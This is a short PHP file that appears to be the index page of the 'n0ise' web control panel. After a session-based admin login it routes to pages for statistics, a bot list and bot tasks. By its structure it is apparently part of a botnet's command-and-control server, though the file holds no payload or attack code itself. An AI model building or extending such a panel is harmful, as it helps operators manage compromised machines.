<?php
include("_bot/run.php");
$_n0ise->tpl = file_get_contents("_bot/design.tpl");

if(!$_SESSION['loggedin'] || $_SESSION['admin_password'] != $_n0ise->admin_password) {
	include("_bot/func/login.php");
	$_n0ise->func = new n0ise_func_login;
	$_n0ise->func->run();
	echo str_replace(array('{content}', '{navigation}'), array($_n0ise->func->content, 'Please login'), $_n0ise->tpl);
	die();
}

include("_bot/func/statisics.php");
include("_bot/func/list.php");
include("_bot/func/tasks.php");
include("_bot/func/logout.php");

$navigation = array(
	'Statisics'=>'?action=statisics',
	'Bots'=>'?action=list',
	'Tasks'=>'?action=tasks',
	'Logout'=>'?action=logout'
);
$nav = '';
foreach($navigation as $name=>$link) $nav .= '<a href="'.$link.'">'.$name.'</a>';

if($_GET['action'] == "tasks") $_n0ise->func = new n0ise_func_tasks;
elseif($_GET['action'] == "list") $_n0ise->func = new n0ise_func_list;
elseif($_GET['action'] == "logout") $_n0ise->func = new n0ise_func_logout;
else $_n0ise->func = new n0ise_func_statistics;

$_n0ise->func->run();

echo str_replace(array('{content}', '{navigation}'), array($_n0ise->func->content, $nav), $_n0ise->tpl);

?>